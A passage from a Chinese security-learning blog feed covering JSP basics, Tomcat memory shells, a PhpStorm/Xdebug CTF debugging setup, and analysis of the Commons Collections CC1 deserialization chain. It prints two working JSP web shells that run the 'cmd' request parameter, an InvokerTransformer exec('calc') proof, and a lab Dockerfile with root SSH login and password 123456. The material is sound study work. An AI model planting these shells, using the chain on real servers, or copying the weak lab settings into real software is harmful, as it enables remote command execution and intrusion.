title="编写代码"></a>编写代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello 你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后访问</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429000025817.png" alt="image-20240429000025817"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><blockquote><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p></blockquote><p>直接在webapp文件夹下创建jsp文件即可</p><p>脚本程序的语法格式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>任何文本、HTML标签、JSP元素必须写在脚本程序的外面。</p><h3 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h3><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们。</p><p>JSP声明的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declaration; [ declaration; ]+ ... %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure><p>程序示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! int i = 0; %&gt; </span><br><span class="line">&lt;%! int a, b, c; %&gt; </span><br><span class="line">&lt;%! Circle a = new Circle(2.0); %&gt; </span><br></pre></td></tr></table></figure><hr><h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。</p><p>由于表达式的值会被转化成String，所以您可以在一个文本行中使用表达式而不用去管它是否是HTML标签。</p><p>表达式元素中可以包含任何符合Java语言规范的表达式，但是不能使用分号来结束表达式。</p><p>JSP表达式的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式 %&gt;</span><br></pre></td></tr></table></figure><p>同样，您也可以编写与之等价的XML语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   表达式</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>传统无回显木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429191039735.png" alt="image-20240429191039735"></p><p>有回显木马:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>如上的木马特征强,容易识别, 且需要文件落地, 由此,引出隐蔽性强,无需文件的内存马</p><h3 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h3><p>后面需要调试Tomcat, 重新弄个环境,参考:</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><p>在此之前, 需要先了解Tomcat架构</p><p>膜拜大佬博客</p><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><h4 id="Tomcat三大组件"><a href="#Tomcat三大组件" class="headerlink" title="Tomcat三大组件"></a>Tomcat三大组件</h4><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p>三大组件的加载顺序为<code>**Listener-&gt;Filter-&gt;Servlet**</code>。</p><h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><blockquote><p>在Tomcat中，Context是Container组件的一种子容器，其对应的是一个Web应用。Context中可以包含多个Wrapper容器，而Wrapper对应的是一个具体的Servlet定义。因此Context可以用来保存一个Web应用中多个Servlet的上下文信息。</p></blockquote><h4 id="Tomcat中的三种Context"><a href="#Tomcat中的三种Context" class="headerlink" title="Tomcat中的三种Context"></a>Tomcat中的三种Context</h4><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/1-795x1500.jpg"></p><blockquote><p>ServletContext接口的实现类为ApplicationContext类和ApplicationContextFacade类，其中ApplicationContextFacade是对ApplicationContext类的包装。我们对Context容器中各种资源进行操作时，最终调用的还是StandardContext中的方法，因此StandardContext是Tomcat中负责与底层交互的Context。</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP storm + Xdebug 远程调试docker项目</title>
      <link href="/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/"/>
      <url>/2024/03/27/PHP-storm-Xdebug-%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95docker%E9%A1%B9%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-storm-Xdebug-远程调试docker项目-ssh隧道"><a href="#PHP-storm-Xdebug-远程调试docker项目-ssh隧道" class="headerlink" title="PHP storm + Xdebug 远程调试docker项目(ssh隧道)"></a>PHP storm + Xdebug 远程调试docker项目(ssh隧道)</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><h2 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h2><ol><li>docker环境</li><li>你需要调试的项目</li></ol><p>这里需要调试的项目以上次在做NKCTF的一道题目为例</p><p>题目原 Dockerfile</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br></pre></td></tr></table></figure><p>我们需要对dockerfile进行修改以使用于调试</p><ol><li>安装ssh服务。 PHPSTORM需要 ssh 来进行目录映射，不然无法成功 Debug</li><li>安装 xdebug。这是调试的基础扩展组件</li><li>设置 ssh 允许 root 登陆。毕竟只是个 docker 调试环境，就不弄那么麻烦了。当然如果是线上业务啥的当然要做好权限分配。</li><li>修改 root密码。毕竟不知道密码也无法连接</li><li>启动 ssh 服务</li><li>重启 apache 服务</li></ol><p>可以看见这里拉取了php8.0, 这里我们需要下载安装对应版本的xdebug, 这非常关键!!!</p><p>附一个各php版本对应的xdebug版本, 其他版本另行搜索</p><table><thead><tr><th>php版本</th><th>xdebug版本</th></tr></thead><tbody><tr><td>php7.0</td><td>xdebug 2.8.1</td></tr><tr><td>php7.1</td><td>xdebug 2.9.8</td></tr><tr><td>php7.2</td><td>xdebug 3.1.5</td></tr><tr><td>php7.3</td><td>xdebug 3.1.5</td></tr><tr><td>php7.4</td><td>xdebug 3.1.5</td></tr><tr><td>php8.0</td><td>xdebug 3.1.5</td></tr><tr><td>php8.1</td><td>xdebug 3.1.5</td></tr></tbody></table><p>因此我们需要的是xdebug 3.1.5</p><p>去这个网站查看xdebug(不需要下载下来)</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327221042712.png" alt="image-20240327221042712"></p><p>可以看见对应有xdebug 3.1.5按照这个文件名, 添加一个dockerfile语句</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    docker-php-ext-enable xdebug</span></span><br></pre></td></tr></table></figure><p>在Dockerfile的同级目录新建一个start.sh文件, 用于完成步骤3,4,5</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment">#设置 ssh 允许 root 登录</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;PermitRootLogin yes&#x27;</span> &gt;&gt; /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">#修改root密码</span></span><br><span class="line"><span class="built_in">echo</span> root:123456 | chpasswd</span><br><span class="line"><span class="comment">#配置 Xdebug。Xdebug 3 的配置如下，和 Xdebug 2不太一样</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_host = host.docker.internal&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.client_port = 9003&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.mode = debug&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.max_nesting_level = 1000&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;xdebug.discover_client_host = true&quot;</span> &gt;&gt; /usr/local/etc/php/conf.d/docker-php-ext-xdebug.ini</span><br><span class="line"><span class="comment">#重启 nginx ssh</span></span><br><span class="line">service nginx restart</span><br><span class="line">service ssh restart</span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">#原作者在这加了一个sleep infinity并叮嘱一定加上...... 我们这里千万不要加, 不然进程会一直卡在这导致你访问不了web页面</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment">######################################</span></span><br></pre></td></tr></table></figure><p>千万要注意这里题目中使用的是nginx, 不是apache2</p><p>之后继续对dockerfile做出调整, 最终为</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ctfhub/web_nginx_mysql_php_8.<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> files /var/www/html</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> sh -c <span class="string">&#x27;mysqld_safe &amp;&#x27;</span> \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">sleep</span> 5s \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; mysql -e <span class="string">&quot;source /var/www/html/db.sql;&quot;</span> -uroot -proot </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pecl install http://pecl.php.net/get/xdebug-3.1.5.tgz \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; docker-php-ext-enable xdebug \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get update \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; apt-get install ssh -y</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/app</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/config</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 777 /var/www/html/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./start.sh /start.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x /start.sh</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;/start.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>修改好start.sh和dockerfile之后, 我们手动创建一个镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t mycodbox .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240327234247184.png" alt="image-20240327234247184"></p><p>之后新建一个容器把81和22端口映射出来</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328000916452.png" alt="image-20240328000916452"></p><p>看到这里就算成功了</p><p>访问一下也没什么问题</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001145301.png" alt="image-20240328001145301"></p><p>之后配置phpstorm, 这里原文中就没什么坑了</p><p>直接跳转到原文链接的方法二, </p><p><a href="https://www.freebuf.com/articles/web/266512.html">https://www.freebuf.com/articles/web/266512.html</a></p><p>后面至作简单的示例</p><p>选择这个</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001340954.png" alt="image-20240328001340954"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001418960.png" alt="image-20240328001418960"></p><p>一路next</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001550926.png" alt="image-20240328001550926"></p><p>一路next直到看见项目</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328001907238.png" alt="image-20240328001907238"></p><p>之后要做</p><ol><li>配置 CLI Interpreter</li><li>配置目录映射</li><li>设置Xdebug端口</li><li>配置一个 Run&#x2F;Debug Configuration</li><li>启动 PHP Debug Listening</li></ol><p><strong>配置 CLI Interpreter</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP。设置 CLI Interpreter</p><p>新建一个 CLI Interpreter。选择 From Docker, Vagrant, VM, WSL,Remote….</p><p>这里我们可以填 SSH，也可以直接选择 Docker。我这里用的是 SSH</p><p>设置 PHP executable 路径。不知道可以进入 container 中使用<code>whereis php</code>进行搜索</p><p>参考原文, 这里不做演示了</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002119294.png" alt="image-20240328002119294"></p><p><strong>配置 目录映射</strong></p><p>进入 File -&gt; Settings -&gt; Languages &amp; Frameworks -&gt; PHP -&gt; Servers。配置目录映射</p><p>注意一定要把 Use path mappings 的勾勾上，才能配置目录映射</p><p>Absolute path on the server 是要手动打上服务器路径的</p><p><strong>配置一个 Run&#x2F;Debug Configuration</strong></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002530718.png" alt="image-20240328002530718"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002948142.png" alt="image-20240328002948142"></p><p>打个断点试试, 成功!!</p><p><strong><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240328002929316.png" alt="image-20240328002929316"></strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化之CC链</title>
      <link href="/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/"/>
      <url>/2024/03/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCC%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/web/335892.html">https://www.freebuf.com/articles/web/335892.html</a></p><p><a href="https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89">https://boogipop.com/2023/03/02/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%A0%94%E7%A9%B6/#1X2-%E6%B7%B1%E5%85%A5%E7%A0%94%E7%A9%B6CC%E9%93%BE%EF%BC%881-7%EF%BC%89</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>jdk-8u65</p><p><a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html</a></p><p>jdk源码</p><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p><p>maven3.6.3</p><p><a href="https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/">https://archive.apache.org/dist/maven/maven-3/3.6.3/binaries/</a></p><p>关于maven的配置教程</p><p><a href="https://blog.csdn.net/succing/article/details/127281200">https://blog.csdn.net/succing/article/details/127281200</a></p><p>坑比较多, 不过上面这几篇文章都能完美解决</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315213238197.png" alt="image-20240315213238197"></p><p>到这里环境就搭建好了</p><p>现在开始分析链子</p><h2 id="链子分析"><a href="#链子分析" class="headerlink" title="链子分析"></a>链子分析</h2><p>还记得Java反序列化的基础吗, 我们需要一个readObject方法来作为反序列化的入口</p><p>而我们的最终目的当然是命令执行</p><p>一个正常的思路应该是从链子的尾部开始的, 先找到危险函数, 再想办法如何调用到它</p><p>所以首先是寻找一个可以命令执行的地方</p><p>这里需要的是Transformer这个接口</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317132926538.png" alt="image-20240317132926538"></p><p>ctrl + alt + B查看实现了该接口的类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133044679.png" alt="image-20240317133044679"></p><p>这里要用到的就是InvokerTransformer这个类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317133325160.png" alt="image-20240317133325160"></p><p>InvokerTransformer的transform方法存在反射调用任意类</p><p>浅试一下利用InvokerTransformer类来弹个计算器</p><p>根据这个构造函数来传入参数</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141434267.png" alt="image-20240317141434267"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">runtime</span>  <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;);</span><br><span class="line">        invokerTransformer.transform(runtime);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317141358312.png" alt="image-20240317141358312"></p><p>这里就成功弹了计算器</p><p>现在我们找到了一个最终的出口, 接下来就是要返回去找哪里调用了这个危险的transform方法</p><p>右键find useges, 找到这个TransformedMap</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317142752780.png" alt="image-20240317142752780"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143423354.png" alt="image-20240317143423354"></p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317143534346.png" alt="image-20240317143534346"></p><p>第203行的checkSetValue调用了valueTransformer下的transform, 而这个valueTransformer是由构造函数的参数决定的</p><p>并且, 构造器TransformedMap是一个protected保护类型, 我们不能从外部直接调用, 需要从其他调用了TransformedMap的地方入手 </p><p>在<code>decorate()</code>静态方法中, 直接new了一个TransformedMap对象</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317144110965.png" alt="image-20240317144110965"></p><p>控制valueTransformer的地方有了, 那么谁来调用checkSetValue呢?</p><p>依旧是find useages</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317145629199.png" alt="image-20240317145629199"></p><p>在AbstractInputCheckedMapDecorator这个抽象类中的**setValue()**调用了checkSetValue方法</p><p>并且AbstractInputCheckedMapDecorator是TransformedMap的父类</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240317175103045.png" alt="image-20240317175103045"></p><p>这里就不得不补一下java集合的知识, </p><p>在遍历一个集合时, 可以使用增强for循环进行一下操作</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Integer, String&gt; entry : map.entrySet()) &#123;</span><br><span class="line">    <span class="comment">//Map.entry&lt;Integer,String&gt; 映射项（键-值对）  有几个方法：用上面的名字entry</span></span><br><span class="line">    <span class="comment">//entry.getKey() ;entry.getValue(); entry.setValue();</span></span><br><span class="line">    <span class="comment">//map.entrySet()  返回此映射中包含的映射关系的 Set视图。</span></span><br><span class="line">    System.out.println(<span class="string">&quot;key= &quot;</span> + entry.getKey() + <span class="string">&quot; and value= &quot;</span> + entry.getValue());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中Map.Entry&lt;Integer, String&gt; entry表示键值对, map.entrySet()表示键值对的集合</p><p>这里setValue()就是entry下的一个方法</p><p>因此我们可以利用TransformedMap里的decorate创建一个TransformedMap实例, 由于其继承了AbstractInputCheckedMapDecorator类, 当调用setValue时, 就对调用AbstractInputCheckedMapDecorator下的setValue, 从而调用parent.checkSetValue(value);</p><p>那么, 这个parent又是怎么一回事呢?</p><p>好像很少有文章把这个讲的很明白(或许是我太菜了)</p><p>我们预期的parent应该是一个InvokerTransformer的对象</p><p>不妨调试一下看看怎么个事</p><p>注意看这个transformedmap.entrySet()</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318220856808.png" alt="image-20240318220856808"></p><p>跟进</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240318221154799.png" alt="image-20240318221154799"></p><p>这里跳到了TransformedMap的父类AbstractInputCheckedMapDecorator下的entrySet(), 